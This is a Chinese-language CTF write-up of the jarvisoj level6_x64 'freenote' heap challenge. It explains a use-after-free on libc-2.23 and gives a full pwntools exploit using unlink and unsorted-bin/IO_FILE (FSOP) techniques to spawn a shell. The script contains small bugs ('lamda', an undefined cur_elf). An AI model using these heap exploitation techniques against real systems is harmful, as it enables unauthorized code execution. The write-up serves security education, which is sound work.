# jarvisoj_level6_x64



### 总结

根据本题，学习与收获有：

- 一般来说，在`libc-2.23.so`中，能用`unlink`的题目，基本可以用`unsorted bin attack + IO_FILE`劫持`IO_jump_t`结构执行`system("/bin/sh")`。不用能`unlink`的题目，但是能溢出修改`unsorted bin chunk`的`size`并布局`unsorted bin chunk`内容，都可以用这一招偷鸡。
- 修改`unsorted bin`的`size`为`0x61`， 然后从`unsorted bin chunk`的头部开始，布局如下：`[/bin/sh\x00, 0x61 0, _IO_list_all - 0x10, 0, 1, 0xa8 * "\x00", fake_vtable_addr]`，然后`fake_vtable`填的内容如下：`[0, 0, 0, system_addr]`。

<!-- more -->

### checksec

![image-20210609233419964](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210609233419964.png)

运行环境为`ubuntu 16.04`，`libc-2.23.so`。

### 题目分析

最开始分配一个`0x1820`的`chunk`，用于管理所有的`note`结构。布局如下：

![image-20210609233717583](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210609233717583.png)

需要注意的是：

- 最后`malloc`的参数并不是用户输入的`input_size`，而是对齐到`0x80`的大小。但是记录的`size`确实输入的那个数。
- 在`edit_note`函数中，`realloc`的参数也被同样处理过
- 有一个`read`函数，必须填满`size`，否则会等待输入
- 使用`status`来判断`note`的使用状态，而不是指针

### 漏洞分析

漏洞点就一个`UAF`：

![image-20210609234212715](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210609234212715.png)

### 利用思路

一般来说，`UAF`可以用来泄露地址。这里有两种利用思路，分别讲一下;

**利用`unlink`**：

- 利用`unsorted bin`的`fd`指针分别泄露出`heap`地址和`libc`地址，这样就得到了最初那个`0x1820`大小的`chunk`的地址
- 利用`realloc`功能来构造`unlink`条件，结合`uaf`漏洞，修改某个`ptr`为`ptr - 0x18`，这个`ptr`在`0x1820`堆块上
- 利用`edit`修改`atoi@got`为`system`地址
- 输入`/bin/sh`拿`shell`

**利用`unsorted bin attack + IO_FILE`**:

- 用同样的方法去泄露地址
- 布局`IO_FILE`结构
- 修改`unsorted bin chunk`的`size`为`0x61`
- 调用`malloc`，触发`IO_flush_all_lock_up`，刷新所有流，执行`system("/bin/sh")`

### 最终EXP

```python
from pwn import *

sh = process('freenote_x64')

int16 = lambda x : int(x, base=16)
LOG_ADDR = lamda: x, y: log.info("Addr: {} ===> {}".format(x, y))
libc = ELF('libc-2.23.so')

context.arch="amd64"


def list_note():
    sh.sendlineafter("Your choice: ", "1")
    msg = sh.recvuntil("== 0ops Free Note ==\n")
    info("msg: {}".format(msg))
    return msg


def new_note(length, data):
    sh.sendlineafter("Your choice: ", "2")
    sh.sendlineafter("Length of new note: ", str(length))
    sh.sendafter("Enter your note: ", data)
    sh.recvline()


def edit_note(idx, length, data):
    sh.sendlineafter("Your choice: ", "3")
    sh.sendlineafter("Note number: ", str(idx))
    sh.sendlineafter("Length of note: ", str(length))
    sh.sendafter("Enter your note: ", data)
    sh.recvline()


def delete_note(idx):
    sh.sendlineafter("Your choice: ", "4")
    sh.sendlineafter("Note number: ", str(idx))
    sh.recvline()


def attack_unlink():
    # leak addr
    new_note(0x80, "a" * 0x80) # 0 a
    new_note(0x100, "a" * 0x100) # 1 b
    new_note(0x80, "a" * 0x80) # 2 c
    new_note(0x80, "a" * 0x80) # 3 d

    delete_note(2)
    delete_note(0) # a ---> c

    new_note(0x80, "a" * 0x80) # c
    delete_note(2) # c ---> a
    # leak heap addr
    msg  = list_note()
    idx = msg.find(b"\n")
    leak_heap_addr = u64(msg[3:idx].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)

    new_note(0x80, "b" * 0x80) # a

    # leak libc addr
    msg  = list_note()
    idx = msg.find(b"\n")
    leak_libc_addr = u64(msg[3:idx].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc_base_addr)

    libc.address = libc_base_addr

    # realloc and unlink
    layout = [0, 0x101, leak_heap_addr-0x17d8 - 0x18, 
            leak_heap_addr - 0x17d8 - 0x10, 0xe0 * "a",
            0x100, 0x90]
    edit_note(1, 0x180, flat(layout, length=0x180, filler="a"))

    delete_note(0)

    layout = [0, [1, 8, cur_elf.got['atoi']] * 2]
    edit_note(1, 0x180, flat(layout, length=0x180, filler="\x00"))

    edit_note(1, 8, flat(libc.sym['system']))

    sh.sendlineafter("Your choice: ", "/bin/sh")

    sh.interactive()


def attack_io_file():
    # leak addr
    new_note(0x200, "a" * 0x200) # 0 a
    new_note(0x80, "a" * 0x80) # 1 b
    new_note(0x200, "a" * 0x200) # 2 c
    new_note(0x80, "a" * 0x80) # 3 d

    delete_note(2)
    delete_note(0) # a ---> c

    new_note(0x200, "a" * 0x200) # c
    delete_note(2) # c ---> a
    # leak heap addr
    msg  = list_note()
    idx = msg.find(b"\n")
    leak_heap_addr = u64(msg[3:idx].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)

    new_note(0x200, "b" * 0x200) # a

    # leak libc addr
    msg  = list_note()
    idx = msg.find(b"\n")
    leak_libc_addr = u64(msg[3:idx].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc_base_addr)

    libc.address = libc_base_addr

    io_list_all_addr = libc.sym['_IO_list_all']
    layout = ["a" * 0x80, 0, 0x211]
    edit_note(1, 0x280, flat(layout, length=0x280, filler="a"))

    # re-put unsorted bin 
    delete_note(0)

    layout = ["a" * 0x80, "/bin/sh\x00", 0x61,
                0, io_list_all_addr - 0x10, 0, 1, 0xa8 * "\x00",
                leak_heap_addr + 0x380, 0, 0, [libc.sym['system']] * 3]

    edit_note(1, 0x280, flat(layout, length=0x280, filler="\x00"))

    sh.sendlineafter("Your choice: ", "2")
    sh.sendlineafter("Length of new note: ", str(0x300))

    sh.interactive()



if __name__ == '__main__':
    import random
    if random.randint(0, 100) >= 50:
        info("Use unlink!\n")
        sleep(3)
        attack_unlink()
    else:
        info("Use IO_FILE!\n")
        sleep(3)
        attack_io_file()
```

远程打：

`unlink`：

![image-20210609235541204](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210609235541204.png)

`FSOP`:

![image-20210609235423075](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210609235423075.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-06-09-jarvisoj-level6-x64/  

